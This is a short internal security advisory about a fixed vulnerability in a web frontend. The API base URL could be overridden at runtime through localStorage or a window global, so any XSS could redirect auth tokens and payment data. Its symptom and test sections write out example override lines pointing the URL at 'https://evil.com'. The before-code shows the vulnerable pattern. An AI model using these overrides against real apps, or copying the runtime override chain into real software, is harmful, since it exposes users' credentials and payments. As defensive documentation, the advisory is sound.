# localstorage-api-url-hijack

**Issue:** localStorage-based API URL override enables XSS to redirect all API traffic
**Date:** 2026-08-09
**Repo:** example-org/example-repo at 316f773e
**Author:** the platform team
**Status:** fixed (316f773e)

## Symptom
XSS payload can set `localStorage.example project_WORKER_URL = "https://evil.com"` or `window.__example project_WORKER__ = "https://evil.com"`, redirecting all subsequent API calls (auth tokens, user data, payments) to an attacker-controlled server.

## Root cause
Frontend code resolved the API base URL at runtime from multiple sources with a fallback chain:
1. `window.__example project_WORKER__` (global override)
2. `localStorage.getItem("example project_WORKER_URL")`
3. `process.env.NEXT_PUBLIC_CF_WORKER_URL`

An XSS vulnerability anywhere in the app could set #1 or #2 and capture all subsequent API traffic including auth tokens and payment data.

## Fix
API base URL comes exclusively from build-time environment variables. All runtime overrides removed:

```ts
// BEFORE — runtime override chain
const WORKER_URL = window.__example project_WORKER__
  || localStorage.getItem("example project_WORKER_URL")
  || process.env.NEXT_PUBLIC_CF_WORKER_URL;

// AFTER — build-time only
const WORKER_URL = process.env.NEXT_PUBLIC_CF_WORKER_URL ?? "";
```

Extracted into a single shared module (`apps/web/src/lib/workerUrl.ts`) used by all 34 components that previously redeclared the URL.

## Verification
- **Test:** `typeof window.__example project_WORKER__` → undefined (not checked)
- **Test:** `localStorage.setItem("example project_WORKER_URL", "evil")` → no effect on API calls
- **CI:** PR #<number> green

## Gotchas
- NEVER trust runtime-writable storage (localStorage, sessionStorage, cookies, URL params, window globals) for security-critical configuration
- Build-time env vars are baked into the bundle and not modifiable at runtime
- This pattern applies to any SPA: API base URLs, auth endpoints, CDN URLs
- The corollary: if you NEED runtime config (e.g. feature flags), validate against an allowlist

## Related
- `security/owasp-top-10-2025.md` (XSS)
- `lessons/example project-audit-2026-08.md`
- `patterns/feature-cookbook-feature-flags.md`
